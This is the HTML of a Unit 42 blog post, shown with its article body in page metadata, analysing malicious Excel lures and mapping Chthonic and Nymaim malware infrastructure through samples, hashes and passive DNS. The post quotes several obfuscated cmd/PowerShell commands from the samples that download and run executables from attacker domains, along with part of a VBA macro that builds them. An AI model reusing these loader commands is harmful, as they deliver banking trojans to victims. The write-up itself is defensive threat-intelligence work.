
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>The curious case of Notepad and Chthonic: Exposing a malicious infrastructure</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="New research from Palo Alto Networks Unit 42: the curious case of Notepad and Chthonic: exposing a malicious infrastructure."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="The curious case of Notepad and Chthonic: Exposing a malicious infrastructure" />
<meta property="og:description" content="New research from Palo Alto Networks Unit 42: the curious case of Notepad and Chthonic: exposing a malicious infrastructure." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Chthonic" />
<meta property="article:tag" content="microsoft" />
<meta property="article:tag" content="Nymaim" />
<meta property="article:tag" content="Powershell" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2017-08-15T12:00:23+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:width" content="650" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="New research from Palo Alto Networks Unit 42: the curious case of Notepad and Chthonic: exposing a malicious infrastructure." />
<meta name="twitter:title" content="The curious case of Notepad and Chthonic: Exposing a malicious infrastructure" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; The Curious Case of Notepad and Chthonic: Exposing a Malicious Infrastructure Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure/feed/" />
<meta property="og:likes" content="0"/>
<meta property="og:readtime" content="10"/>
<meta property="og:views" content="22,010"/>
<meta property="og:date_created" content="August 15, 2017 at 5:00 AM"/>
<meta property="og:post_length" content="3193"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Jeff White"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/jeff-white/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"The Curious Case of Notepad and Chthonic: Exposing a Malicious Infrastructure","name":"The Curious Case of Notepad and Chthonic: Exposing a Malicious Infrastructure","description":"New research from Palo Alto Networks Unit 42: the curious case of Notepad and Chthonic: exposing a malicious infrastructure.\n","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure\/","datePublished":"August 15, 2017","articleBody":"Recently, I\u2019ve been investigating malware utilizing PowerShell and have spent a considerable amount of time refining ways to identify new variants of attacks as they appear. This posting is a follow-up of my previous work on this subject in \u00a0\"Pulling Back the Curtains on EncodedCommand PowerShell Attacks\".\n\nIn a sample I recently analyzed, something stood out as extremely suspicious which led me down a rabbit hole, uncovering malicious infrastructure supporting Chthonic, Nymaim, and other malware and malicious websites.\n\nThroughout this blog post I present my analysis and thought process during this research, but if you would just like a list of the findings, they are over on our Unit42 GitHub.\nOne of these things is not like the others\u2026\nMost commonly, PowerShell is launched from a Microsoft Office document that uses a VBA macro to launch PowerShell to perform something malicious \u2013 typically downloading the \u201creal\u201d malware to run. I focused my hunting on the PowerShell activity with Palo Alto Networks AutoFocus to determine whether it\u2019s worth digging into further based on \u201cuniqueness\u201d and functionality.\n\nIn this case, the first sample I looked at stood out for another reason entirely. If you take a look at the below PowerShell, you\u2019ll quickly understand why.\n&lt;null&gt; , cMd.exe \/c \"p^Ow^ERS^hel^l^.e^x^e^ -nO^l -No^Ni^Nt^ -W^InDO^ws^ 1 -NoprO^FIle^ -eX^Ec^U B^Ypa^S^s $fos=''',''';$hit='dfil';$fd=');sta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='%ap';$uy='pdat';$ji='a%.ex';$pol='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'https:\/\/notepad-plus-plus[.]org\/repository\/7.x\/7.4.2\/npp.7.4.2.Installer.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)\"\n\nThis code downloads a file from the legitimate Notepad++ website. My initial thought was the worst-case scenario \u2013 they\u2019ve been compromised and are distributing malware! I immediately downloaded the file from the website, but everything looked normal. Of course, I had to investigate further.\n\nThe sample stayed true to the previous outline I laid out for these attacks: the Microsoft Excel document appeared to be a lure about financial information, specifically a VAT invoice written in Polish as shown below.\n\n\n\nLooking under the hood we see the VBA code that builds the PowerShell command and launches it but something seemed off. There are a ton of functions that are clearly decoding information from arrays after which it executes an already decoded PowerShell command. I decided to debug the macro and see exactly what it\u2019s doing before I made any decisions.\n\n\n\nIf you look at the above image, there are five things to note.\n\n1. The variable \u2018horrorr\u2019 (double \u2018r\u2019) is the result of all of the previously mentioned decoding functions. This builds a PowerShell command.\n\n2.You can see \u2018Shelleeeee horrorr, 0\u2019 commented out, I believe this was intended to launch the previous PowerShell command.\n\n3. The \u2018Debug.Print horrorr\u2019 prints the content of that variable in the \u2018Immediate\u2019 area shown in the screenshot. The domain in this command is NOT \u2018notepad-plus-plus.org\u2019 and can be seen below.\ncMd.exe   \/c \"p^Ow^ERS^hel^l^.e^x^e^  -nO^l -No^Ni^Nt^  -W^InDO^ws^ 1 -NoprO^FIle^  -eX^Ec^U  B^Ypa^S^s $fos=''',''';$hit='dfil';$fd=');sta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='%ap';$uy='pdat';$ji='a%.ex';$pol='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'https:\/\/farhenzel[.]co\/gls.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)\"\n4. The \u2018MsgBox\u2019 will pop-up and not display anything, because the variable passed is \u2018horror\u2019 (1 \u2018r\u2019) along with the message \u2018Do you really think I'm not a virus?\u2019 in Polish.\n\n5. The hard coded PowerShell command with \u2018notepad-plus-plus.org\u2019 will run.\n\nThe most likely conclusion that can be drawn here is that an analyst or researcher obtained this file, modified it to see the content (misspelling the variable name along the way) post-decoding, and uploaded it to see what it did in a sandbox. To be sure though, I needed to find other samples and see how they stacked up against this one.\n\nGoing back to the PowerShell command, the initial reason I stopped to look at it was due to the way they concatenated variables to form the download command and output. This also provides a perfect pivot point to hunt for samples. Using the below string to search Process Activity in AutoFocus revealed 171 samples.\n$dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim\nThe dates were all fairly recent, having been received in the past few days since the beginning of August. The documents shared the same themes for lures but the VBA macro and resulting PowerShell were more along the lines of what I expected.\n\nFor sample \u201c538ff577a80748d87b5e738e95c8edd2bd54ea406fe3a75bf452714b17528a87\u201d the following is an excerpt from the VBA macro building the PowerShell command.\ntntcurier = \"$fos=''\" + \"',''';$hit='df\" + \"il';$fd=');sta';$dr='(ne';$ed\" + \"='ject '\" + \";$ipo='syst';$kos='t.we';$rem='ent).do';$sad\"\ntntcurier = tntcurier + \"='wn\" + \"l\" + \"oa';$kp\" + \"='w-\" + \"ob'\" + \";$nim='e(''\" + \"';$mo='\" + cautrunova(2) + \"';$\" + \"uy='\" + cautrunova(2) + \"';$ji\" + \"='\" + cautrunova(2) + \".e\" + \"x';$po\" + \"l='em.\" + \"ne';$oe='e''';$jik='rt-p\" + \"ro';$naw='c\" + \"ess ''';$lim='bc\" + \"li';I\" + \"nv\" + \"oke-E\" + \"xp\" + \"ression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'h\" + \"t\" + \"t\" + \"ps:\" + \"\/\/naiillad.\" + \"dat\" + \"e\/u\" + \"3.\" + poro + \"xe\" + \"'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)\"\nAlong with the subsequent Process Activity using the newly built PowerShell command, which aligns with what was commented out of the first sample analyzed.\nWindows\\SysWOW64\\cmd.exe , cMD.exe \/c \"p^Ow^ERS^hel^l^.e^x^e^ -nO^l -No^Ni^Nt^ -W^InDO^ws^ 1 -NoprO^FIle^ -eX^Ec^U B^Ypa^S^s $fos=''',''';$hit='dfil';$fd=');sta';$dr='(ne';$ed='ject ';$ipo='syst';$kos='t.we';$rem='ent).do';$sad='wnloa';$kp='w-ob';$nim='e(''';$mo='tt';$uy='lf';$ji='qo.ex';$pol='em.ne';$oe='e''';$jik='rt-pro';$naw='cess ''';$lim='bcli';Invoke-Expression($dr+$kp+$ed+$ipo+$pol+$kos+$lim+$rem+$sad+$hit+$nim+'https:\/\/naiillad[.]date\/u3.exe'+$fos+$mo+$uy+$ji+$oe+$fd+$jik+$naw+$mo+$uy+$ji+$oe)\"\n\nGiven this, I iterated over all 171 samples and extracted the following URL\u2019s where PowerShell is downloading a payload.\nhttp:\/\/ditetec[.]com\/ts.exe\nhttp:\/\/ditetec[.]com\/u2.exe\nhttp:\/\/domass[.]com.ua\/index.gif\nhttp:\/\/firop[.]com\/ego.exe\nhttp:\/\/unoset[.]com\/jpx.exe\nhttp:\/\/unoset[.]com\/sxr.exe\nhttps:\/\/doci[.]download\/inc.exe\nhttps:\/\/farhenzel[.]co\/gls.exe\nhttps:\/\/farsonka[.]co\/trb.exe\nhttps:\/\/formsonat[.]co\/mrb.exe\nhttps:\/\/fortuma[.]co\/scu.exe\nhttps:\/\/iilliiill[.]bid\/6ven.exe\nhttps:\/\/iilliiill[.]bid\/ven.exe\nhttps:\/\/iilliiill[.]bid\/ven.tvv\nhttps:\/\/lom[.]party\/mov.exe\nhttps:\/\/naiillad[.]date\/ex3.exe\nhttps:\/\/naiillad[.]date\/u3.exe\nhttps:\/\/naiillad[.]date\/vmer.exe\nhttps:\/\/naiillad[.]date\/vsync.exe\nhttps:\/\/notepad-plus-plus[.]org\/repository\/7.x\/7.4.2\/npp.7.4.2.Installer.exe\nhttps:\/\/prof[.]cricket\/wp.exe\nhttps:\/\/tvavi[.]win\/pago.exe\n\nPass the Chthonic\nGoing back to the Process Activity, we can see the SHA256 value of each downloaded file and compile a list of hashes for further pivoting as shown below.\n\n\n\nAfter iterating over the 171 samples, we\u2019re left with this list of hashes for the downloaded files. Note that there are fewer payloads than there are samples, indicating many of the documents download the same payload.\n\nBelow is a table with the compile date and some PDB strings found within a few of the binaries. Most of the compile times are within the past two months, with 6 in August and a couple from as recently as two days ago at the time of this writing.\n\n\n\nSHA256\nCompile Date\nPDB String\n\n\n29c7740f487a461a96fad1c8db3921ccca8cc3e7548d44016da64cf402a475ad\n2016-12-10 01\n\n\n\nd5e56b9b5f52293b209a60c2ccd0ade6c883f9d3ec09571a336a3a4d4c79134b\n2016-12-10 03\nC:\\RAMDrive\\Charles\\heaven\\reams\\Teac.pdb\n\n\ndd5f237153856d19cf20e80ff8238ca42047113c44fae27b5c3ad00be2755eea\n2016-12-10 16\nC:\\Cleaner\\amuse\\rang\\AutoPopulate\\la.pdb\n\n\na5001e9b29078f532b1a094c8c16226d20c03922e37a4fca2e9172350bc160a0\n2016-12-20 18\n\n\n\n8284ec768a06b606044defe2c2da708ca6b3b51f8e58cb66f61bfca56157bc88\n2017-07-05 10\n\n\n\nf0ce51eb0e6c33fdb8e1ccb36b9f42139c1dfc58d243195aedc869c7551a5f89\n2017-07-09 20\nC:\\TableAdapter\\encyclopedia\\Parik.pdb\n\n\n145d47f4c79206c6c9f74b0ab76c33ad0fd40ac6724b4fac6f06afec47b307c6\n2017-07-10 08\nC:\\ayakhnin\\reprductive\\distortedc.pdb\n\n\ndc8f34829d5fede991b478cf9117fb18c32d639573a827227b2fc50f0b475085\n2017-07-11 01\nC:\\positioning\\scrapping\\Szets\\thi.pdb\n\n\n7fe1069c118611113b4e34685e7ee58cb469bda4aa66a22db10842c95f332c77\n2017-07-11 02\nC:\\NeXT\\volatile\\legacyExchangeDNs.pdb\n\n\n5edf117e7f8cd176b1efd0b5fd40c6cd530699e7a280c5c7113d06e9c21d6976\n2017-07-12 23\n\n\n\n2a80fdda87127bdc56fd35c3e04eb64a01a159b7b574177e2e346439c97b770a\n2017-07-13 00\n\n\n\na9021e253ae52122cbcc2284b88270ceda8ad9647515d6cca96db264a76583f5\n2017-07-18 00\n\n\n\ndd639d76ff6f33bbfaf3bd398056cf4e95e27822bd9476340c7703f5b38e0183\n2017-07-18 00\n\n\n\ne5a00b49d4ab3e5a3a8f60278b9295f3d252e3e04dadec2624bb4dcb2eb0fada\n2017-07-24 17\n\n\n\n6263730ef54fbed0c2d3a7c6106b6e8b12a6b2855a03e7caa8fb184ed1eabeb2\n2017-07-24 22\nC:\\Snapshot\\Diskette\\hiding\\ROCKMA.pdb\n\n\n43bfaf9a2a4d46695bb313a32d88586c510d040844f29852c755845a5a09d9df\n2017-07-25 06\n\n\n\nb41660db6dcb0d3c7b17f98eae3141924c8c0ee980501ce541b42dc766f85628\n2017-07-25 06\nC:\\mdb\\Changed\\Container\\praise.pdb\n\n\n9acdad02ca8ded6043ab52b4a7fb2baac3a08c9f978ce9da2eb51c816a9e7a2e\n2017-07-25 07\n\n\n\n2ddaa30ba3c3e625e21eb7ce7b93671ad53326ef8b6e2bc20bc0d2de72a3929d\n2017-07-25 20\nC:\\helpers\\better\\Expr\\Eight\\DS.pdb\n\n\nb836576877b2fcb3cacec370e5e6a029431f59d5070da89d94200619641ca0c4\n2017-07-26 12\nC:\\V\\regard\\violates\\update\\AMBW\\a.pdb\n\n\n0972fc9602b00595e1022d9cfe7e9c9530d4e9adb5786fea830324b3f7ff4448\n2017-07-26 20\n\n\n\n2c258ac862d5e31d8921b64cfa7e5a9cd95cca5643c9d51db4c2fcbe75fa957a\n2017-07-27 01\nC:\\executablery\\constructed\\IIc.pdb\n\n\ndd9c558ba58ac81a2142ecb308ac8d0f044c7059a039d2e367024d953cd14a00\n2017-07-27 02\n\n\n\ncb3173a820ac392005de650bbd1dd24543a91e72d4d56300a7795e887a8323b2\n2017-07-31 14\nC:\\letterbxing\\EVP\\Chices\\legit.pdb\n\n\na636f49814ea6603534f780b83a5d0388f5a5d0eb848901e1e1bf2d19dd84f05\n2017-07-31 18\nC:\\Biomuse\\moment\\705\\cnvincing.pdb\n\n\n677dd11912a0f13311d025f88caabeeeb1bda27c7c1b5c78cffca36de46e8560\n2017-07-31 21\n\n\n\nfdedf0f90d42d3779b07951d1e8826c7015b3f3e724ab89e350c9608e1f23852\n2017-08-01 21\n\n\n\n142bf7f47bfbd592583fbcfa22a25462df13da46451b17bb984d50ade68a5b17\n2017-08-02 09\n\n\n\n6f4b2c95b1a0f320da1b1eaa918c338c0bab5cddabe169f12ee734243ed8bba8\n2017-08-02 12\nC:\\cataloging\\Dr\\VarianceShadows11.pdb\n\n\nfd5fd7058cf157ea249d4dcba71331f0041b7cf8fd635f37ad13aed1b06bebf2\n2017-08-04 02\nC:\\dumplings\\That\\BIT\\Warez\\loc.pdb\n\n\n5785c2d68d6f669b96c3f31065f0d9804d2ab1f333a90d225bd993e66656b7d9\n2017-08-07 12\nC:\\Lgisys\\hypothesized\\donatedc.pdb\n\n\n675719a9366386034c285e99bf33a1a8bafc7644874b758f307d9a288e95bdbd\n2017-08-07 17\nC:\\work\\cr\\nata\\cpp\\seven\\seven\\release\\seven.pdb\n\n\n\nAt least one of the binaries compiled in August had a PDB string I was able to locate online in a collection of other PDB files, so they may be introducing their malicious code into these files before compiling someone else\u2019s project.\n\nOnce the file has been downloaded and executed, the new process will launch a legitimate executable, such as \u201cmsiexec.exe\u201d, and inject code into it. This code will then download further payloads through a POST request to various websites. This pattern is shared across the original samples.\n\n\n\nThese HTTP requests match known patterns for a banking Trojan named Chthonic, which is a variant of Zeus. A good write-up from 2014 on the malware can be found in this writeup from Yury Namestnikov, Vladimir Kuskov, Oleg Kupreev at Kaspersky Lab here and indicates that the returned data is an RC4 encrypted loader that sets-up the main Chthonic module which can download additional modules or malware.\nA dab of Nymaim\nIterating once again over the 171 samples and scraping out the HTTP POST requests, I ended up with the below set of domains.\namellet[.]bit\ndanrnysvp[.]com\nejtmjealr[.]com\nfirop[.]com\ngefinsioje[.]com\ngesofgamd[.]com\nponedobla[.]bit\nunoset[.]com\nUsing this as the next pivot, we have 6,034 unique samples that get returned in AutoFocus having made POST requests to these sites. Additionally, we can see there were at least 3 very large campaigns where Palo Alto Networks saw activity to these sites in July.\n\n\nFrom these distribution sites, we can see that 5,520 samples are making HTTP requests to them and these samples have been identified as another downloader Trojan named Nymaim.\n\nThe majority of the overall samples came from the following four sites.\nejtmjealr[.]com\ngefinsioje[.]com\ngesofgamd[.]com\nponedobla[.]bit\n\nThe \u2018ejtmjealr[.]com\u2019 domain is particularly interesting due to a similar domain, \u2018ejdqzkd[.]com\u2019 being discussed by Jaros\u0142aw Jedynak of CERT.PL in this analysis of Nymaim from earlier in the year. They go on to discuss how Nymaim uses a static configuration to contact that domain, which will return IP\u2019s that go into a DGA and output the actual IP addresses needed for C2 communication. Ben Baker, Edmund Brumaghin and Jonah Samost of Talos have a fantastic write-up of this process here.\n\nRaising the dead \u2013 Infrastructure Archeology\n\nTo continue my analysis, I shifted focus to Maltego so as to visually graph the infrastructure. For this task, I used PassiveTotal\u2019s Passive DNS and AutoFocus Maltego transforms. We see below the passive resolutions for these domains and how it reveals a number of IP addresses being shared between the four domains identified above.\n\n\n\nAll of the 707 IP addresses can be found here. Note that while these IP\u2019s have been found to be hosting malicious content, this could change in the future.\n\nPivoting off the five highlighted IP\u2019s above with a shared infrastructure, I pulled the reverse DNS to see what other sites may be present. The below is a sampling of the domains returned through this process.\n\n\n\nThe \u201cidXXXXX.top\u201d pattern immediately stands out and may suggest a pattern in the static configuration for the initial domains used by the DGA for Nymaim since the previous two started with \u201cejX.com.\n\nGiven the level of overlap already, I proceeded to grab all of the passive DNS available for each of the 707 IP addresses. A full list of the domains can be seen here. The below Maltego graph is used to simply illustrate the two distinct clusters of infrastructure that appeared and their interconnectedness.\n\n\n\nFrom the first cluster on the left, if we sort by incoming links per node a pattern stands out in the domain names looking similar to the previously mentioned Nymaim ones. In the below image, the top domains are sorted by incoming links on the right side. Each link is a corresponding IP address and show that these domains have been rotated quite a bit between the infrastructure.\n\n\n\nA quick search with the AutoFocus transform to pull tag information shows these are specifically related to Nymaim, most likely for the DGA seed; however, looking at domains with less links, other malware families begin to emerge.\n\nThe cluster on the right is actually collapsing one collection of entities due to the sheer size of it. Below is the collection expanded in all of its glory.\n\n\n\nBelow are the domain names linked to the singular IP address in the center.\n\n\n\nAll of these connected domains follow a pattern similar to phishing attacks masquerading as legitimate services \u2013 in this case \u201conline.verify[.]paypal\u201d (588) and \u201chmrc.secure[.]refund\u201d (1021).\n\nIn addition to domains of that type, there is evidence of other malware distribution being carried out on this infrastructure. Collapsing the collection back down, note the two domains \u201cbrontorittoozzo[.]com\u201d and \u201crandomessstioprottoy[.]net\u201d that fall outside of the collection due to more infrastructure connections.\n\n\n\nA quick search for these domains will land you on fellow Unit 42 researcher Brad Duncan\u2019s malware-traffic-analysis (MTA) site for post \u201c2017-06-22 - LOCKY MALSPAM - PDF ATTACHMENTS WITH EMBEDDED .DOCM FILES\u201d in which he lists out URL\u2019s found within malicious Microsoft Word documents that download Locky as shown below.\n\n\n\nIn some of the other smaller clusters, you\u2019ll find groupings of like malicious sites.\n\nFor example, there is a group with gems like \u201cpremarket[.]ws\u201d like you see below being hosted on this shared infrastructure, which is a forum for less than legal services.\n\n\n\nAlong with sites like \u201cslilpp[.]ws\u201d which is another less than reputable site as shown below.\n\n\n\nWhich ironically has a Twitter support account that specifically states the following.\n\n\n\nAnd yet another here below\u2026\n\n\n\nThere are 632 people happily following along with relatively easy to track down accounts and usernames. A substantial amount of these accounts, on quick review, appear to follow the typical Nigerian cybercrime patterns detailed in other blogs.\n\nFinally, there were multiple clusters of domains used by the Hancitor malware dropper to host the initial check-in and tracking as shown here.\n\n\n\nWhich can be seen as having been used in a campaign on July 03, 2017 via a post on MTA below.\n\n\nConclusion\nBy pivoting off of one sample we were able to zoom out and identify a sizable infrastructure of what appears to be 707 IP\u2019s and 2,611 domains being utilized for malicious activity.\n\nAs such, these findings represent a collection of compromised websites, compromised registrar accounts used to spin up subdomains, domains used by malware DGA\u2019s, phishing kits, carding forums, malware C2 sites, and a slew of other domains that revolve around criminal activity.\n\nHopefully this analysis has been helpful in understanding how truly connected some of these infrastructures can be and how with a little digging, you can uncover a substantial amount of operationally useful indicators to protect you and yours.\n\nAutoFocus users can identify and track these threats using the Chthonic, Nymaim, and NotepadInfrastructure tags.\n\n&nbsp;","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Jeff White"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"39862","token":"7e15a0f8b3","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=39862' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-the-curious-case-of-notepad-and-chthonic-exposing-a-malicious-infrastructure%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
